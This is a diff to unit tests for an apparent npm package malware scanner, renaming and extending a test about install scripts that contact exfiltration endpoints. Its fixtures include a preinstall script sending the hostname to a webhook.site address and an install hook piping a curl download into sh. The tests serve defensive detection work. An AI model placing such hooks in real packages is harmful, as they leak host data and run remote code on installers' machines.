@@ -66,10 +66,16 @@ class DetectionTests(unittest.TestCase):
         self.assertEqual(hook["sev"], "CRITICAL")
         self.assertIn("setup.js", hook["msg"])
 
-    def test_install_script_contacting_exfil_endpoint(self):
+    def test_install_script_sending_to_an_exfil_endpoint(self):
+        # 0.1.8: the send is the finding and the service its label; the
+        # service's address alone is an install hook to review
+        res = scan({"package.json": manifest(preinstall="node ./lib/check.js"),
+                    "lib/check.js": ("const os = require('os');\n"
+                                     "fetch('https://webhook.site/0000-example?h=' + os.hostname());\n")})
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
         res = scan({"package.json": manifest(preinstall="node ./lib/check.js"),
                     "lib/check.js": "fetch('https://webhook.site/0000-example');\n"})
-        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertEqual(res["verdict"], "WARN")
 
     def test_hook_that_pipes_a_download_to_a_shell(self):
         res = scan({"package.json": manifest(install="curl -s http://192.0.2.1/x | sh")})
